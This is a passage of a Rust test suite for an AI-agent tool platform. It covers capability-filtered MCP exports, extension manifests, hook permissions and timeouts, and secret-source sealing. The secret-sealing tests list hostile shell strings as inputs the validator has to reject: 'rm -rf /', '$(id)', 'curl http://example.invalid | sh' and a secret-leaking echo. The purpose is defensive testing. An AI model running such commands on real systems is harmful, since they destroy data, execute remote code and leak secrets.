            .items()
            .iter()
            .map(|item| item.capability().as_str())
            .collect();
        assert_eq!(
            exported,
            ["automonique.fs.read", "automonique.prompt.triage"]
        );
        assert!(
            !exported.contains(&"automonique.shell.exec"),
            "an ungranted tool must be absent from the export, not refused later"
        );
        assert!(
            !exported.contains(&"automonique.artifact.review"),
            "resources are capability-filtered too"
        );
        assert!(
            McpServerExport::capability_filtered(&items, &grant(&[]))
                .items()
                .is_empty(),
            "an empty grant exports nothing"
        );
    }

    #[test]
    fn an_export_carries_only_tools_resources_and_prompts() {
        for item in &export_items() {
            // An exhaustive match: a new export shape could not be added
            // without this arm list failing to compile.
            match item {
                ExportItem::Tool(capability) => assert!(!capability.as_str().is_empty()),
                ExportItem::Resource(resource) => {
                    // Every exported artifact class states how long it is kept,
                    // so an unrestricted artifact has no representation.
                    assert!(ArtifactRetention::ALL.contains(&resource.retention()));
                    assert_eq!(resource.artifact_class(), "review-bundle");
                }
                ExportItem::Prompt(prompt) => assert!(!prompt.schema().digest().is_empty()),
            }
        }
    }
}

mod manifest_completeness {
    use super::*;

    fn parts(contribution: ExtensionContribution) -> ExtensionManifestParts<'static> {
        ExtensionManifestParts {
            name: "acme-tickets",
            contribution,
            protocol_range: SupportedRange::new(1, 2).expect("valid range"),
            schema_range: SupportedRange::new(3, 4).expect("valid range"),
            required_sandbox: profile(),
            file_grants: &["/var/lib/acme"],
            network: ToolWorkloadEgress::denied(),
            credential_audiences: CredentialAudiences::none(),
            resources: resources(),
            licence: "Elastic-2.0",
            publisher: "acme",
            provenance: ProvenanceDigest::new("sha256:build").expect("valid digest"),
            content_address: "sha256:package",
            signature: ExtensionSignature::new("key-1", "sig-1").expect("valid signature"),
            update_channel: UpdateChannel::Pinned,
            configuration_schema: SchemaContract::new("acme.config/v1", "sha256:config")
                .expect("valid schema"),
            migration: MigrationBehavior::RequiresManualReview,
        }
    }

    fn backend() -> ExtensionContribution {
        ExtensionContribution::Backend(
            BackendContribution::new(
                BackendExtensionKind::Tool,
                "main.js",
                vec![CapabilityId::new("automonique.fs.read").expect("valid capability")],
            )
            .expect("valid contribution"),
        )
    }

    fn user_interface() -> ExtensionContribution {
        ExtensionContribution::UserInterface(
            SurfaceContribution::new(UiSurface::Dashboard, "index.js", "acme.panel")
                .expect("valid contribution"),
        )
    }

    #[test]
    fn every_declared_field_is_carried_and_readable() {
        let manifest = ExtensionManifest::declare(parts(backend())).expect("valid manifest");

        assert_eq!(manifest.name(), "acme-tickets");
        assert_eq!(manifest.contribution().kind_str(), "tool");
        assert_eq!(manifest.contribution().entry_point(), "main.js");
        assert_eq!(manifest.protocol_range().minimum(), 1);
        assert!(manifest.protocol_range().contains(2));
        assert!(!manifest.schema_range().contains(2));
        assert_eq!(manifest.required_sandbox().id(), "workspace-offline");
        assert_eq!(manifest.file_grants(), ["/var/lib/acme"]);
        assert_eq!(manifest.network(), ToolWorkloadEgress::denied());
        assert!(manifest.credential_audiences().is_empty());
        assert_eq!(manifest.resources(), resources());
        assert_eq!(manifest.licence(), "Elastic-2.0");
        assert_eq!(manifest.publisher(), "acme");
        assert_eq!(manifest.provenance().as_str(), "sha256:build");
        assert_eq!(manifest.content_address(), "sha256:package");
        assert_eq!(manifest.signature().publisher_key(), "key-1");
        assert_eq!(manifest.update_channel(), UpdateChannel::Pinned);
        assert_eq!(manifest.configuration_schema().id(), "acme.config/v1");
        assert_eq!(
            manifest.migration(),
            MigrationBehavior::RequiresManualReview
        );
    }

    #[test]
    fn a_backend_extension_carries_the_capabilities_it_declares() {
        let manifest = ExtensionManifest::declare(parts(backend())).expect("valid manifest");
        assert_eq!(manifest.backend_capabilities().len(), 1);
        assert_eq!(
            manifest.backend_capabilities()[0].as_str(),
            "automonique.fs.read"
        );
    }

    #[test]
    fn a_ui_extension_has_no_backend_capabilities_at_all() {
        let manifest = ExtensionManifest::declare(parts(user_interface())).expect("valid manifest");
        assert_eq!(manifest.contribution().kind_str(), "user_interface");
        assert!(
            manifest.backend_capabilities().is_empty(),
            "a UI contribution has no field to hold backend authority"
        );
        // The namespace is where its own state lives, and it is required.
        match manifest.contribution() {
            ExtensionContribution::UserInterface(surface) => {
                assert_eq!(surface.namespace(), "acme.panel");
                assert_eq!(surface.surface(), UiSurface::Dashboard);
            }
            ExtensionContribution::Backend(_) => unreachable!("declared as a UI extension"),
        }
    }

    #[test]
    fn a_manifest_requires_a_name_licence_publisher_and_content_address() {
        for (field, mutate) in [
            (
                "name",
                (|parts: &mut ExtensionManifestParts<'static>| parts.name = "")
                    as fn(&mut ExtensionManifestParts<'static>),
            ),
            ("licence", |parts| parts.licence = ""),
            ("publisher", |parts| parts.publisher = ""),
            ("content_address", |parts| parts.content_address = ""),
        ] {
            let mut declared = parts(backend());
            mutate(&mut declared);
            assert_eq!(
                ExtensionManifest::declare(declared)
                    .expect_err("an incomplete manifest is not a manifest")
                    .category(),
                "field_invalid",
                "an empty {field} was accepted"
            );
        }
    }

    #[test]
    fn a_supported_range_cannot_run_backwards() {
        assert!(SupportedRange::new(4, 3).is_err());
        assert!(SupportedRange::new(3, 3).is_ok());
    }

    #[test]
    fn every_backend_kind_and_surface_has_a_distinct_spelling() {
        let mut spellings: Vec<&str> = BackendExtensionKind::ALL
            .iter()
            .map(|kind| kind.as_str())
            .chain(UiSurface::ALL.iter().map(|surface| surface.as_str()))
            .collect();
        let total = spellings.len();
        spellings.sort_unstable();
        spellings.dedup();
        assert_eq!(spellings.len(), total);
        assert_eq!(total, 12);
    }
}

mod hook_class_powers {
    use super::*;

    #[test]
    fn each_class_has_exactly_one_distinct_power() {
        assert_eq!(HookClass::ALL.len(), 5);
        assert_eq!(HookPower::ALL.len(), 5);
        let mut powers: Vec<HookPower> = HookClass::ALL.iter().map(|c| c.power()).collect();
        powers.sort_unstable();
        powers.dedup();
        assert_eq!(powers.len(), 5, "two classes share a power");
        for power in HookPower::ALL {
            assert!(
                HookClass::ALL.iter().any(|class| class.power() == power),
                "{} belongs to no class",
                power.as_str()
            );
        }
        // The powers reach five distinct surfaces, which is what makes the
        // surface comparison in can_perform an identity on powers rather than
        // an accident of two powers sharing one surface.
        let mut surfaces: Vec<&str> = HookPower::ALL
            .iter()
            .map(|power| power.surface().as_str())
            .collect();
        surfaces.sort_unstable();
        surfaces.dedup();
        assert_eq!(surfaces.len(), 5, "two powers reach the same surface");
    }

    #[test]
    fn no_class_can_perform_a_prohibited_action() {
        assert_eq!(ProhibitedHookAction::ALL.len(), 4);
        for class in HookClass::ALL {
            for action in ProhibitedHookAction::ALL {
                assert!(
                    !class.can_perform(HookAction::Prohibited(action)),
                    "{} could {}",
                    class.as_str(),
                    action.as_str()
                );
            }
        }
    }

    #[test]
    fn the_prohibition_is_computed_and_not_a_constant() {
        // A `false` in can_perform's place would satisfy the test above while
        // measuring nothing. The same comparison answers `true` when the
        // surfaces do meet, so both directions are pinned: a class can perform
        // its own power and nothing else.
        assert_eq!(HookAction::ALL.len(), 9);
        let mut answered_true = 0;
        for class in HookClass::ALL {
            assert!(
                class.can_perform(HookAction::Exercise(class.power())),
                "{} cannot exercise its own power",
                class.as_str()
            );
            for action in HookAction::ALL {
                let expected = action == HookAction::Exercise(class.power());
                assert_eq!(
                    class.can_perform(action),
                    expected,
                    "{} answered wrongly for {}",
                    class.as_str(),
                    action.as_str()
                );
                answered_true += usize::from(class.can_perform(action));
            }
        }
        assert_eq!(
            answered_true, 5,
            "exactly one action per class may be answered yes"
        );
    }

    #[test]
    fn each_prohibited_action_needs_a_distinct_privileged_surface() {
        // If two prohibitions shared a surface, one of them would be resting
        // on the other's answer rather than on its own.
        let mut spellings: Vec<&str> = ProhibitedHookAction::ALL
            .iter()
            .map(|action| action.surface().as_str())
            .collect();
        spellings.sort_unstable();
        assert_eq!(
            spellings,
            [
                "approval_ledger",
                "recorded_history",
                "sandbox_specification",
                "unbounded_time"
            ],
            "the four prohibited actions no longer need four distinct privileged surfaces"
        );
    }

    #[test]
    fn no_hook_power_reaches_a_privileged_surface() {
        let privileged = [
            Surface::ApprovalLedger,
            Surface::SandboxSpecification,
            Surface::RecordedHistory,
            Surface::UnboundedTime,
        ];
        for power in HookPower::ALL {
            assert!(
                !privileged.contains(&power.surface()),
                "{} reaches {}",
                power.as_str(),
                power.surface().as_str()
            );
        }
        // Each prohibited action needs one of those surfaces, which is why no
        // class can perform it.
        for action in ProhibitedHookAction::ALL {
            assert!(
                privileged.contains(&action.surface()),
                "{} was reclassified as an ordinary surface",
                action.as_str()
            );
        }
    }

    #[test]
    fn a_class_admits_only_its_own_outcome() {
        let outcomes = vec![
            HookOutcome::Observed,
            HookOutcome::rejected("policy").expect("valid outcome"),
            HookOutcome::replaced(schema("hook.output/v1"), "redacted").expect("valid outcome"),
            HookOutcome::context_added("untrusted:web", "page text").expect("valid outcome"),
            HookOutcome::enqueued("input-1").expect("valid outcome"),
        ];
        assert_eq!(outcomes.len(), HookClass::ALL.len());

        let mut admitted = 0;
        for class in HookClass::ALL {
            for outcome in &outcomes {
                if class.admits(outcome) {
                    admitted += 1;
                    assert_eq!(class.power(), outcome.power());
                }
            }
        }
        assert_eq!(
            admitted, 5,
            "the class-to-outcome table must be a bijection"
        );
        assert!(!HookClass::Observer.admits(&outcomes[1]));
        assert!(!HookClass::Filter.admits(&outcomes[2]));
    }

    #[test]
    fn only_filter_and_transformer_change_an_outcome() {
        assert!(HookClass::Filter.may_change_outcome());
        assert!(HookClass::Transformer.may_change_outcome());
        assert!(!HookClass::Observer.may_change_outcome());
        assert!(!HookClass::ContextProvider.may_change_outcome());
        assert!(!HookClass::WorkflowTrigger.may_change_outcome());
    }

    #[test]
    fn class_spellings_are_distinct() {
        let mut spellings: Vec<&str> = HookClass::ALL.iter().map(|c| c.as_str()).collect();
        let total = spellings.len();
        spellings.sort_unstable();
        spellings.dedup();
        assert_eq!(spellings.len(), total);
    }

    #[test]
    fn a_hook_cannot_block_indefinitely() {
        // The ceiling is named as a literal, not as itself: a test written
        // only as `millis(MAX_MILLIS + 1)` holds however high MAX_MILLIS is
        // raised, so the declared 30 seconds would not be measured at all.
        assert_eq!(
            HookTimeout::MAX_MILLIS,
            30_000,
            "the declared hook ceiling is 30s"
        );
        assert_eq!(
            HookTimeout::millis(0)
                .expect_err("a zero timeout is not a timeout")
                .category(),
            "budget_is_zero"
        );
        assert_eq!(
            HookTimeout::millis(HookTimeout::MAX_MILLIS + 1)
                .expect_err("a hook may not outlast its ceiling")
                .category(),
            "budget_out_of_range"
        );
        assert_eq!(
            HookTimeout::millis(HookTimeout::MAX_MILLIS)
                .expect("the ceiling itself is valid")
                .get(),
            HookTimeout::MAX_MILLIS
        );
    }

    #[test]
    fn ordering_timeout_and_failure_policy_are_declared_and_deterministic() {
        let timeout = HookTimeout::millis(250).expect("valid timeout");
        let bindings = vec![
            HookBinding::new(
                "c",
                HookClass::Transformer,
                30,
                timeout,
                HookFailurePolicy::FailClosed,
            )
            .expect("valid binding"),
            HookBinding::new(
                "a",
                HookClass::Observer,
                10,
                timeout,
                HookFailurePolicy::RecordAndProceed,
            )
            .expect("valid binding"),
            HookBinding::new(
                "b",
                HookClass::Filter,
                20,
                timeout,
                HookFailurePolicy::FailClosed,
            )
            .expect("valid binding"),
        ];
        let mut reversed = bindings.clone();
        reversed.reverse();

        let chain = HookChain::declare(bindings).expect("valid chain");
        let same = HookChain::declare(reversed).expect("valid chain");
        let order: Vec<&str> = chain.bindings().iter().map(HookBinding::id).collect();
        assert_eq!(order, ["a", "b", "c"]);
        assert_eq!(chain, same, "the order must not depend on input order");
        assert_eq!(
            chain.bindings()[0].failure_policy(),
            HookFailurePolicy::RecordAndProceed
        );
        assert_eq!(chain.bindings()[0].timeout().get(), 250);
    }

    #[test]
    fn two_hooks_cannot_claim_the_same_position() {
        let timeout = HookTimeout::millis(250).expect("valid timeout");
        let bindings = vec![
            HookBinding::new(
                "a",
                HookClass::Observer,
                10,
                timeout,
                HookFailurePolicy::FailClosed,
            )
            .expect("valid binding"),
            HookBinding::new(
                "b",
                HookClass::Observer,
                10,
                timeout,
                HookFailurePolicy::FailClosed,
            )
            .expect("valid binding"),
        ];
        assert_eq!(
            HookChain::declare(bindings).expect_err("an ambiguous order is not deterministic"),
            ToolError::HookOrderNotUnique { order: 10 }
        );
    }
}

mod secret_sealing {
    use super::*;

    fn helper_schema() -> ArgumentSchema {
        ArgumentSchema::new(vec![
            ArgumentSlot::fixed("show").expect("valid token"),
            ArgumentSlot::named("item").expect("valid name"),
        ])
    }

    fn source(retrieval: SecretRetrieval) -> SecretSource {
        SecretSource::new("db-password", "postgres", retrieval).expect("valid source")
    }

    #[test]
    fn a_command_helper_is_a_pinned_executable_with_a_closed_schema() {
        let command = SecretCommand::bind(
            PinnedExecutable::new("/usr/bin/pass-helper").expect("valid executable"),
            helper_schema(),
            &["db"],
        )
        .expect("valid command");

        assert_eq!(command.executable().as_str(), "/usr/bin/pass-helper");
        assert_eq!(command.argv(), ["show", "db"]);
        assert!(
            command.environment().variables().is_empty(),
            "a helper environment is empty"
        );
    }

    #[test]
    fn a_shell_string_in_the_executable_position_is_refused() {
        for candidate in [
            "sh -c 'echo secret'",
            "/bin/helper; rm -rf /",
            "/bin/helper | tee /tmp/x",
            "/bin/helper && other",
            "/bin/helper$(id)",
        ] {
            assert_eq!(
                PinnedExecutable::new(candidate)
                    .expect_err("shell-shaped")
                    .category(),
                "secret_source_open_arguments",
                "{candidate} was accepted as an executable"
            );
        }
    }

    #[test]
    fn a_relative_executable_is_refused() {
        for candidate in ["sh", "bash", "pass-helper", "./helper"] {
            assert_eq!(
                PinnedExecutable::new(candidate)
                    .expect_err("an unpinned executable resolves through PATH")
                    .category(),
                "secret_source_open_arguments",
                "{candidate} was accepted as a pinned executable"
            );
        }
    }

    #[test]
    fn a_shell_string_cannot_be_smuggled_through_an_argument() {
        // The escape a pinned-executable check alone does not close: put the
        // shell text in argv instead of in the executable.
        let schema = ArgumentSchema::new(vec![
            ArgumentSlot::fixed("-c").expect("valid token"),
            ArgumentSlot::named("script").expect("valid name"),
        ]);
        for payload in [
            "curl http://example.invalid | sh",
            "echo $SECRET; rm -rf /",
            "a && b",
            "$(id)",
            "`id`",
            "x > /tmp/leak",
        ] {
            assert_eq!(
                SecretCommand::bind(
                    PinnedExecutable::new("/bin/sh").expect("valid executable"),
                    schema.clone(),
                    &[payload],
                )
                .expect_err("an argument is a single inert token, not a script")
                .category(),
                "secret_source_open_arguments",
                "{payload} was accepted as an argument"
            );
        }
    }

    #[test]
    fn a_pinned_interpreter_with_one_inert_word_is_still_representable() {
        // The limit of the screen, pinned so the type documentation cannot
        // drift back into claiming more than this. Every token must be a
        // single shell-inert word; one such word is indistinguishable in shape
        // from a vault item name, so a pinned interpreter given one is
        // accepted here. Which executables a source may pin is decided where
        // the source is admitted, not by this type.
        let command = SecretCommand::bind(
            PinnedExecutable::new("/bin/sh").expect("an absolute path with no shell syntax"),
            ArgumentSchema::new(vec![
                ArgumentSlot::fixed("-c").expect("valid token"),
                ArgumentSlot::named("script").expect("valid name"),
            ]),
            &["reboot"],
        )
        .expect("one inert word is what this type screens for");
        assert_eq!(command.argv(), ["-c", "reboot"]);
    }

    #[test]
    fn a_fixed_token_is_screened_the_same_way_as_a_bound_one() {
        assert_eq!(
            ArgumentSlot::fixed("-c 'curl | sh'")
                .expect_err("a schema cannot fix a script either")
                .category(),
            "secret_source_open_arguments"
        );
    }

    #[test]
    fn the_argument_count_is_fixed_by_the_schema() {
        let executable = PinnedExecutable::new("/usr/bin/pass-helper").expect("valid executable");
        assert_eq!(
            SecretCommand::bind(executable.clone(), helper_schema(), &[])
                .expect_err("a missing binding"),
            ToolError::SecretSourceArgumentCount {
                declared: 1,
                supplied: 0
            }
        );
        assert_eq!(
            SecretCommand::bind(executable, helper_schema(), &["db", "extra"])
                .expect_err("an extra argument is not in the schema"),
            ToolError::SecretSourceArgumentCount {
                declared: 1,
                supplied: 2
            }
        );
    }

    #[test]
    fn every_source_yields_a_sealed_descriptor_and_no_material() {
        let command = SecretCommand::bind(
            PinnedExecutable::new("/usr/bin/pass-helper").expect("valid executable"),
            helper_schema(),
            &["db"],
        )
        .expect("valid command");

        for retrieval in [
            SecretRetrieval::SystemdCredential {
                name: "db".to_owned(),
            },
            SecretRetrieval::EncryptedLocalStore {
                entry: "db".to_owned(),
            },
            SecretRetrieval::Vault {
                provider: VaultProvider::OnePassword,
                item: "db".to_owned(),
            },
            SecretRetrieval::Vault {
                provider: VaultProvider::Bitwarden,
                item: "db".to_owned(),
            },
            SecretRetrieval::CommandHelper(command.clone()),
        ] {
            let declared = source(retrieval);
            let sealed = declared.sealed();
            assert_eq!(sealed.source(), "db-password");
            assert_eq!(sealed.audience(), "postgres");
            assert!(
                !format!("{sealed:?}").contains("secret-value"),
                "a sealed descriptor carries no material to leak"
            );
        }
    }

    #[test]
    fn a_source_needs_an_identifier_and_an_audience() {
        assert!(
            SecretSource::new(
                "",
                "postgres",
                SecretRetrieval::SystemdCredential {
                    name: "db".to_owned()
                }
            )
            .is_err()
        );
        assert!(
            SecretSource::new(
                "db-password",
                "",
                SecretRetrieval::SystemdCredential {
                    name: "db".to_owned()
                }
            )
            .is_err()
        );
    }
}
